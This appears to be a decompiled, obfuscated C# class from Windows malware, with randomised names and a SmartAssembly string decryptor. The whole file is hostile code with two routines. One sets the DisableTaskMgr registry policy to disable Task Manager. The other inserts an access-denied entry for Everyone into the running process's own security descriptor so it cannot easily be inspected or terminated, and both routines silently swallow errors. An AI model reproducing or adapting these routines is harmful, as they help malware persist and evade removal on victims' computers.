using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class c000012
{
	[NonSerialized]
	internal static GetString f00004a;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr p0, int p1, [Out] byte[] p2, uint fqjRjVAGimM, out uint LDcaymvFyhq);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr p0, int clOREmQcBWhiHvb, [In] byte[] fdvSoJIqQC);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void rhmOIzRJpvKvUO(bool p0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor xqWTjqgGDEvV(IntPtr p0)
	{
		byte[] p = new byte[0];
		GetKernelObjectSecurity(p0, 4, p, 0u, out var LDcaymvFyhq);
		if ((long)LDcaymvFyhq > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(p0, 4, p = new byte[LDcaymvFyhq], LDcaymvFyhq, out LDcaymvFyhq))
		{
			return null;
		}
		return new RawSecurityDescriptor(p, 0);
	}

	private void m000026(IntPtr p0, RawSecurityDescriptor p1)
	{
		byte[] array = new byte[p1.BinaryLength];
		p1.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(p0, 4, array);
	}

	public void ijStrwHioHMPyDK()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = xqWTjqgGDEvV(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			m000026(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static c000012()
	{
		Strings.CreateGetStringDelegate(typeof(c000012));
	}
}
